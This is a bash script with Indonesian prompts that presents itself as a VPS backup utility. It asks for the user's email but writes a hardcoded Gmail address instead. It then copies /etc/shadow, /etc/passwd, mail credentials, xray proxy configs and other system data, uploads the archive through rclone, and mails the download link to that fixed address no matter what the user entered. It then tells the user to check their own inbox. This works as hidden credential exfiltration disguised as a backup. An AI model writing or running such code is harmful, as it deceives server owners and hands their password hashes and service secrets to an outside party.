#!/bin/bash
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Getting
clear
IP=$(wget -qO- ipinfo.io/ip);
date=$(date +"%Y-%m-%d")
clear
email=$(cat /home/email)
if [[ "$email" = "" ]]; then
echo "Masukkan Email Untuk Menerima Backup"
read -rp "Email : " -e email
cat <<EOF>>/home/email
merahjambo@gmail.com
EOF
fi
clear
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/ > /dev/null 2>&1
cp /etc/group backup/ > /dev/null 2>&1
cp /etc/shadow backup/ > /dev/null 2>&1
cp /etc/gshadow backup/ > /dev/null 2>&1
cp /etc/msmtprc backup/ > /dev/null 2>&1
cp /home/email backup/ > /dev/null 2>&1
#cp /etc/ppp/chap-secrets backup/chap-secrets
cp -r /var/lib/ backup > /dev/null 2>&1
cp -r /usr/local/etc/xray backup/xray > /dev/null 2>&1
#cp -r /etc/xray backup/xray > /dev/null 2>&1
cp -r /home/vps backup > /dev/null 2>&1
cp -r /home/vps/public_html backup > /dev/null 2>&1
cp -r /etc/cron.d /root/ backup > /dev/null 2>&1
cp /etc/crontab /root/ backup > /dev/null 2>&1
cd /root
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" merahjambo@gmail.com
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
"
echo "Silahkan cek Kotak Masuk $email"
